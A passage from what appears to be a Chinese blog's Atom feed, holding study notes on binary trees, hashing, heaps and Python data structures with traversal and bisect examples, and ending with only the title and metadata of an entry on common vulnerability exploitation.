<code>⌊lgn⌋+1</code></li></ul></li><li><p>在二叉树的第ｉ（ｉ&gt;=１）层最多有２＾(ｉ - １)个结点。</p></li><li><p>对于任一棵非空二叉树，若其叶结点数为n0，度为2的非叶结点数为n2，则ｎ0 = ｎ2 ＋１</p></li></ul><h3 id="满二叉树"><a href="#满二叉树" class="headerlink" title="满二叉树"></a>满二叉树</h3><blockquote><p>如果每个内部节点（非叶节点）都包含两个孩子，就成为满二叉树</p><p><strong>一棵深度为$k$且有$2^k-1$个结点的二叉树称为满二叉树</strong></p></blockquote><h3 id="完美二叉树-perfect-binary-tree"><a href="#完美二叉树-perfect-binary-tree" class="headerlink" title="完美二叉树(perfect binary tree)"></a>完美二叉树(perfect binary tree)</h3><blockquote><p>当所有的叶子节点都在同一层就是完美二叉树，毫无间隙填充了 h 层。</p></blockquote><h3 id="完全二叉树-complete-binary-tree"><a href="#完全二叉树-complete-binary-tree" class="headerlink" title="完全二叉树(complete binary tree)"></a>完全二叉树(complete binary tree)</h3><blockquote><p>一棵深度为k的有n个结点的二叉树，对树中的结点按从上至下、从左到右的顺序进行编号，如果编号为i（1≤i≤n）的结点与满二叉树中编号为i的结点在二叉树中的位置相同，则这棵二叉树称为完全二叉树</p><p>完全二叉树的特点是：“<strong>叶子节点的位置比较规律</strong>”。因此在对数据进行排序或者查找时可以用到它，比如堆排序就使用了它</p></blockquote><img src="/posts/361891ac/2020-09-30-22-59-44.png" width height="250"><h3 id="二分查找树-搜索树"><a href="#二分查找树-搜索树" class="headerlink" title="二分查找树(搜索树)"></a>二分查找树(搜索树)</h3><p>二叉查找树（又叫二叉排序树），它是具有下列性质的二叉树：</p><ul><li>若左子树不空，则左子树上所有结点的值均小于它的根结点的值；</li><li>若右子树不空，则右子树上所有结点的值均大于或等于它的根结点的值；</li><li>左、右子树也分别为二叉排序树。<ul><li><strong>“递归定义”</strong></li></ul></li></ul><img src="/posts/361891ac/2020-09-30-23-24-32.png" width height="200"><blockquote><p>在最好的情况下，二叉排序树的查找效率比较高，是 O(logn)，其访问性能近似于折半查找；</p><p>但最差时候会是 O(n)，比如插入的元素是有序的，生成的二叉排序树就是一个链表，这种情况下，需要遍历全部元素才行</p></blockquote><h3 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h3><blockquote><p><strong>平衡二叉树的提出就是为了保证树不至于太倾斜，尽量保证两边平衡</strong></p><ul><li>平衡二叉树要么是一棵空树</li><li><strong>要么保证左右子树的高度之差不大于1</strong></li><li>子树也必须是一颗平衡二叉树</li></ul><hr><p><strong>平衡二叉树在添加和删除时需要进行旋转保持整个树的平衡</strong>，内部做了这么复杂的工作后，我们在使用它时，插入、查找的时间复杂度都是<strong>O(logn)</strong>，性能已经相当好了</p></blockquote><h3 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h3><blockquote><p>红黑树，Red-Black Tree 「RBT」是一个<strong>自平衡</strong>(不是绝对的平衡)的二叉查找树(BST)</p></blockquote><ul><li>节点是红色或黑色。</li><li>根是黑色。</li><li>所有叶子都是黑色（叶子是NIL节点）。</li><li>每个红色节点必须有两个黑色的子节点。（<strong>从每个叶子到根的所有路径上不能有两个连续的红色节点</strong>。）</li><li><strong>从任一节点到其每个叶子的所有简单路径都包含相同数目的黑色节点</strong></li></ul><center><img src="/posts/361891ac/1280px-Red-black_tree_example.svg.png" height="200px"></center><blockquote><p>这些约束确保了红黑树的关键特性：<strong>从根到叶子的最长的可能路径不多于最短的可能路径的两倍长</strong>。</p><p>结果是这个树大致上是平衡的。因为操作比如插入、删除和查找某个值的最坏情况时间都要求与树的高度成比例，<strong>这个在高度上的理论上限允许红黑树在最坏情况下都是高效的，而不同于普通的二叉查找树</strong></p></blockquote><h3 id="B树-B-tree"><a href="#B树-B-tree" class="headerlink" title="B树(B-tree)"></a>B树(B-tree)</h3><blockquote><p>B树和平衡二叉树稍有不同的是B树属于多叉树又名平衡多路查找树（查找路径不只两个）</p></blockquote><ul><li>B 树中的每个节点由两部分组成：<ul><li>关键字（可以理解为数据）</li><li>指向孩子节点的指针</li></ul></li><li>每个节点左子树的数据比当前节点都小、右子树的数据都比当前节点的数据大</li><li>若根结点不是终端结点，则至少有2棵子树</li><li>除根节点以外的所有非叶结点至少有 M/2 棵子树，至多有 M 个子树</li></ul><blockquote><p><strong>B 树的每个节点可以表示的信息更多，因此整个树更加“矮胖”，这在从磁盘中查找数据（先读取到内存、后查找）的过程中，可以减少磁盘 IO 的次数，从而提升查找速度</strong></p></blockquote><img src="/posts/361891ac/2020-10-01-01-06-16.png" width height="250"><h3 id="B-树"><a href="#B-树" class="headerlink" title="B+树"></a>B+树</h3><blockquote><p>B+ 树是一种树数据结构，通常用于数据库和操作系统的文件系统中。<strong>B+ 树的特点是能够保持数据稳定有序，其插入与修改拥有较稳定的对数时间复杂度</strong>。</p><p>B+ 树元素自底向上插入，这与二叉树恰好相反</p></blockquote><img src="/posts/361891ac/2020-10-01-01-09-39.png" width height="200"><h3 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h3><p>略</p><h3 id="二叉树遍历"><a href="#二叉树遍历" class="headerlink" title="二叉树遍历"></a>二叉树遍历</h3><ul><li>先(根)序遍历: 先处理根，之后是左子树，然后是右子树</li><li>中(根)序遍历: 先处理左子树，之后是根，最后是右子树</li><li>后(根)序遍历: 先处理左子树，之后是右子树，最后是根</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先序打印二叉树（非递归）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preOrderTravese</span>(<span class="params">node</span>):</span></span><br><span class="line">  stack = [node]</span><br><span class="line">  <span class="keyword">while</span> <span class="built_in">len</span>(stack) &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(node.val)</span><br><span class="line">    <span class="keyword">if</span> node.right:</span><br><span class="line">      stack.append(node.right)</span><br><span class="line">    <span class="keyword">if</span> node.left:</span><br><span class="line">      stack.append(node.left)</span><br><span class="line">    node = stack.pop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 中序打印二叉树（非递归）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inOrderTraverse</span>(<span class="params">node</span>):</span></span><br><span class="line">  stack = []</span><br><span class="line">  pos = node</span><br><span class="line">  <span class="keyword">while</span> pos <span class="keyword">or</span> <span class="built_in">len</span>(stack) &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">if</span> pos:</span><br><span class="line">      stack.append(pos)</span><br><span class="line">      pos = pos.left</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      pos = stack.pop()</span><br><span class="line">      <span class="built_in">print</span>(pos.val)</span><br><span class="line">      pos = pos.right</span><br><span class="line"></span><br><span class="line"><span class="comment"># 层序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">layerTraverse</span>(<span class="params">node</span>):</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> node:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  queue = []  </span><br><span class="line">  queue.append(node)</span><br><span class="line">  <span class="keyword">while</span> <span class="built_in">len</span>(queue) &gt; <span class="number">0</span>:</span><br><span class="line">    tmp = queue.pop(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(tmp.val)</span><br><span class="line">    <span class="keyword">if</span> tmp.left:</span><br><span class="line">      queue.append(tmp.left)</span><br><span class="line">    <span class="keyword">if</span> tmp.right:</span><br><span class="line">      queue.append(tmp.right)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反转二叉树</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse</span>(<span class="params">self, subtree</span>):</span></span><br><span class="line">  <span class="keyword">if</span> subtree <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    subtree.left, subtree.right = subtree.right, subtree.left</span><br><span class="line">    self.reverse(subtree.left)</span><br><span class="line">    self.reverse(subtree.right)</span><br></pre></td></tr></table></figure><h2 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h2><h3 id="哈希冲突-collision"><a href="#哈希冲突-collision" class="headerlink" title="哈希冲突 (collision)"></a>哈希冲突 (collision)</h3><ul><li>链接法(chaining，哈希桶)<ul><li>如果哈希函数选不好的话，可能就导致冲突太多一个链变得太长，这样查找就不再是 O(1) 的了</li></ul></li><li>开放寻址法(open addressing)<ul><li>基本思想是当一个槽被占用的时候，采用一种方式来寻找下一个可用的槽</li><li>线性探查(linear probing)</li><li>二次探查(quadratic probing): 当一个槽被占用，以二次方作为偏移量<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">    key1：hash(key)+0</span><br><span class="line">    key2：hash(key)+1^2</span><br><span class="line">    key3：hash(key)+2^2</span><br><span class="line">    &#96;&#96;&#96;  </span><br><span class="line">  - 双重散列(double hashing): 重新计算 hash 结果。</span><br><span class="line">  - 伪随机序列</span><br><span class="line"></span><br><span class="line">### 装载因子(load factor)</span><br><span class="line"></span><br><span class="line">&gt; 比如我们上边的例子插入了 8 个元素，哈希表总大小是 13， 它的 load factor 就是 8&#x2F;13≈0.62。当我们继续往哈希表插入数据的时候，很快就不够用了。 通常当负载因子开始超过 0.8 的时候，就要新开辟空间并且重新进行散列了。</span><br><span class="line"></span><br><span class="line">### 重哈希(Rehashing)</span><br><span class="line"></span><br><span class="line">&gt; 不同版本的 cpython 使用了不同的策略。python3.3 的策略是扩大为已经使用的槽数目的两倍。开辟了新空间以后，会把原来哈希表里 不为空槽的数据重新插入到新的哈希表里，插入方式和之前一样。这就是 rehashing 操作</span><br><span class="line"></span><br><span class="line">## 堆</span><br><span class="line"></span><br><span class="line">&gt; 堆（英语：Heap）是计算机科学中的一种特别的完全二叉树。若是满足以下特性，即可称为堆：“**给定堆中任意节点P和C，若P是C的母节点，那么P的值会小于等于（或大于等于）C的值**”</span><br><span class="line">&gt; - 若母节点的值恒小于等于子节点的值，此堆称为最小堆（min heap）；</span><br><span class="line">&gt; - 若母节点的值恒大于等于子节点的值，此堆称为最大堆（max heap）</span><br><span class="line">&gt; </span><br><span class="line">&gt; ---</span><br><span class="line">&gt; 在队列中，调**度程序反复提取队列中第一个作业并运行**，因为实际情况中某些时间较短的任务将等待很长时间才能结束，或者某些不短小，**但具有重要性的作业，同样应当具有优先权**。堆即为解决此类问题设计的一种数据结构</span><br><span class="line"></span><br><span class="line">## Python</span><br><span class="line"></span><br><span class="line">### python底层数据结构</span><br><span class="line"></span><br><span class="line">#### 列表和元组</span><br><span class="line"></span><br><span class="line">- 在CPython中，列表被实现为**长度可变的数组**</span><br><span class="line">  - Python在创建这些数组时采用了**指数过分配**，所以**并不是每次操作都需要改变数组的大小**</span><br><span class="line">  - 不幸的是，在普通链表上“代价很小”的其它一些操作在Python中计算复杂度相对过高</span><br><span class="line">    - 利用 list.insert方法在任意位置插入一个元素——复杂度O(N)</span><br><span class="line">    - 利用 list.delete或del删除一个元素——复杂度O(N)</span><br><span class="line"></span><br><span class="line">#### 字典</span><br><span class="line"></span><br><span class="line">- CPython使用**伪随机探测(pseudo-random probing)的散列表(hash table)**作为字典的底层数据结构。由于这个实现细节，只有可哈希的对象才能作为字典的键</span><br><span class="line">  - 从python3.7开始默认Order了</span><br><span class="line"></span><br><span class="line">#### 集合</span><br><span class="line"></span><br><span class="line">- set(): 一种可变的、无序的、有限的集合，其元素是唯一的、不可变的（可哈希的）对象。</span><br><span class="line">- frozenset(): 一种不可变的、可哈希的、无序的集合，其元素是唯一的，不可变的哈希对象。</span><br><span class="line"></span><br><span class="line">&gt; CPython中集合和字典非常相似。事实上，集合被实现为带有空值的字典，只有键才是实际的集合元素。此外，集合还利用这种没有值的映射做了其它的优化。</span><br><span class="line">&gt; </span><br><span class="line">&gt; 由于这一点，可以快速的向集合中**添加元素、删除元素、检查元素是否存在。**平均时间复杂度为O(1)</span><br><span class="line"></span><br><span class="line">### deque</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;py</span><br><span class="line"># 双向队列</span><br><span class="line">from collections import deque</span><br><span class="line"></span><br><span class="line"># 保留最后 N 个元素</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; q &#x3D; deque(maxlen&#x3D;3)</span><br><span class="line">&gt;&gt;&gt; q.append(1)</span><br><span class="line">&gt;&gt;&gt; q.append(2)</span><br><span class="line">&gt;&gt;&gt; q.append(3)</span><br><span class="line">&gt;&gt;&gt; q</span><br><span class="line">deque([1, 2, 3], maxlen&#x3D;3)</span><br><span class="line">&gt;&gt;&gt; q.append(4)</span><br><span class="line">&gt;&gt;&gt; q</span><br><span class="line">deque([2, 3, 4], maxlen&#x3D;3)</span><br><span class="line"></span><br><span class="line"># O(1)</span><br><span class="line">deque([1, 2])</span><br><span class="line">&gt;&gt;&gt; q.append(3)</span><br><span class="line">&gt;&gt;&gt; q</span><br><span class="line">deque([1, 2, 3])</span><br><span class="line">&gt;&gt;&gt; q.appendleft(4)</span><br><span class="line">&gt;&gt;&gt; q</span><br><span class="line">deque([4, 1, 2, 3])</span><br><span class="line">&gt;&gt;&gt; q.pop()</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; q</span><br><span class="line">deque([4, 1, 2])</span><br><span class="line">&gt;&gt;&gt; q.popleft()</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="bisec"><a href="#bisec" class="headerlink" title="bisec"></a>bisec</h3><ul><li>查找： bisect(array, item)</li><li>插入： insort(array,item)</li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数组二分查找</span></span><br><span class="line"><span class="keyword">import</span> bisect</span><br><span class="line"> </span><br><span class="line">a = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">15</span>,<span class="number">20</span>]</span><br><span class="line">position = bisect.bisect(a,<span class="number">13</span>)</span><br><span class="line"><span class="built_in">print</span>(position)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 用可变序列内置的insert方法插入</span></span><br><span class="line">a.insert(position,<span class="number">13</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="number">5</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">20</span>]</span><br></pre></td></tr></table></figure><blockquote><p>bisect还有bisect_left，insort_left的用法，和不带left的用法的区别是：<strong>当插入的元素和序列中的某一个元素相同时</strong>，该插入到该元素的前面（左边，left），还是后面（右边）；如果是查找，则返回该元素的位置还是该元素之后的位置</p></blockquote><h3 id="heapq"><a href="#heapq" class="headerlink" title="heapq"></a>heapq</h3><h3 id="Priority-Queue"><a href="#Priority-Queue" class="headerlink" title="Priority Queue"></a>Priority Queue</h3><h2 id="参考与摘抄"><a href="#参考与摘抄" class="headerlink" title="参考与摘抄"></a>参考与摘抄</h2><ul><li><a href="https://blog.csdn.net/siyue0211/article/details/80560783">[python]list, tuple, dictionary, set的底层细节_四月晴-CSDN博客</a></li><li><a href="https://blog.csdn.net/mxz19901102/article/details/80087596">Python八大排序算法_mxz19901102的博客-CSDN博客</a></li><li><a href="https://blog.csdn.net/m0_37324740/article/details/82763901">Python 实现二叉树的前序、中序、后序、层次遍历（递归和非递归版本）_U R MINE-CSDN博客</a></li><li><a href="https://juejin.im/entry/6844903606408183815">3 分钟理解完全二叉树、平衡二叉树、二叉查找树 - Android</a></li><li><a href="https://juejin.im/entry/6844903613915987975">重温数据结构：理解 B 树、B+ 树特点及使用场景 - Android</a></li><li><a href="https://blog.csdn.net/qq_34914551/article/details/100062973">Python中bisect的使用方法_我的博客有点东西-CSDN博客</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;链表&quot;&gt;&lt;a href=&quot;#链表&quot; class=&quot;headerlink&quot; title=&quot;链表&quot;&gt;&lt;/a&gt;链表&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;链表是一种&lt;strong&gt;物理存储单元上非连续、非顺序的存储结构&lt;/strong&gt;，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。&lt;/p&gt;
&lt;p&gt; 链表由一系列结点（链表中每一个元素称为结点）组成，结点可以在运行时动态生成。 每个结点包括两个部分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个是存储数据元素的&lt;strong&gt;数据域&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;另一个是存储下一个结点地址的&lt;strong&gt;指针域&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;查找&quot;&gt;&lt;a href=&quot;#查找&quot; class=&quot;headerlink&quot; title=&quot;查找&quot;&gt;&lt;/a&gt;查找&lt;/h2&gt;&lt;p&gt;线性查找略&lt;/p&gt;
&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h3 id=&quot;二分查找&quot;&gt;&lt;a href=&quot;#二分查找&quot; class=&quot;headerlink&quot; title=&quot;二分查找&quot;&gt;&lt;/a&gt;二分查找&lt;/h3&gt;&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;binary_search&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;array, val&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;not&lt;/span&gt; array:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    beg = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    end = &lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(array)-&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; beg &amp;lt;= end:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        mid = &lt;span class=&quot;built_in&quot;&gt;int&lt;/span&gt;((beg+end)/&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; array[mid] == val:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; val&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;elif&lt;/span&gt; array[mid] &amp;gt; val:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            end = mid-&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            beg = mid+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;a = &lt;span class=&quot;built_in&quot;&gt;list&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;range&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 正常值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;assert&lt;/span&gt; binary_search(a, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;assert&lt;/span&gt; binary_search(a, -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) == -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 异常值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;assert&lt;/span&gt; binary_search(&lt;span class=&quot;literal&quot;&gt;None&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) == -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 边界值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;assert&lt;/span&gt; binary_search(a, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;排序&quot;&gt;&lt;a href=&quot;#排序&quot; class=&quot;headerlink&quot; title=&quot;排序&quot;&gt;&lt;/a&gt;排序&lt;/h2&gt;&lt;h3 id=&quot;基本排序&quot;&gt;&lt;a href=&quot;#基本排序&quot; class=&quot;headerlink&quot; title=&quot;基本排序&quot;&gt;&lt;/a&gt;基本排序&lt;/h3&gt;&lt;h4 id=&quot;冒泡&quot;&gt;&lt;a href=&quot;#冒泡&quot; class=&quot;headerlink&quot; title=&quot;冒泡&quot;&gt;&lt;/a&gt;冒泡&lt;/h4&gt;</summary>
    
    
    
    <category term="Algorithm" scheme="https://hejueyun.github.io/categories/Algorithm/"/>
    
    <category term="Data Structure" scheme="https://hejueyun.github.io/categories/Algorithm/Data-Structure/"/>
    
    
    <category term="Note" scheme="https://hejueyun.github.io/tags/Note/"/>
    
  </entry>
  
  <entry>
    <title>常见漏洞利用</title>
    <link href="https://hejueyun.github.io/posts/336e90f4/"/>
    <id>https://hejueyun.github.io/posts/336e90f4/</id>
    <published>2020-09-28T06:49:32.000Z</published>
    <updated>2021-04-25T07:09:09.466Z</updated>
    
